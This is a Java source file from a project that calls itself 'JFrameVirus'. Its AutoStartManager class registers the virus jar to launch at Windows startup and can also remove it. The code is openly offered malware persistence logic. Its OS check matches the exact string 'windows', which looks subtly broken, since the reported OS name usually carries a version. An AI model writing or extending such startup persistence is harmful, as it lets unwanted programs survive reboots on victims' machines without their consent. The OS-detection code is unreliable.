package com.joo.jframevirus.autostart;

public class AutoStartManager {
    private final AbstractAutoStartUnit autoStartUnit;

    private static AutoStartManager instance;

    private AutoStartManager() {
        autoStartUnit = this.makeAutoStartUnit();
    }

    private AbstractAutoStartUnit makeAutoStartUnit() {
        AbstractAutoStartUnit autoStartUnit =
                switch (System.getProperty("os.name").toLowerCase()) {
                    case "windows" -> new WinAutoStartUnit();
                    default -> null; // TODO: 5/15/22 add support for other OS (linux, mac)
                };
        if (autoStartUnit != null) {
            autoStartUnit.setAutoStartFileName("JFrameVirus.jar"); // executable file name
        }
        return autoStartUnit;
    }

    public static AutoStartManager getInstance() {
        if (instance == null) {
            instance = new AutoStartManager();
        }
        return instance;
    }

    public void addVirusToStartup() {
        if (autoStartUnit != null) {
            autoStartUnit.addToAutoStart();
        }
    }

    public void removeVirusFromStartup() {
        if (autoStartUnit != null) {
            autoStartUnit.removeFromAutoStart();
        }
    }
}
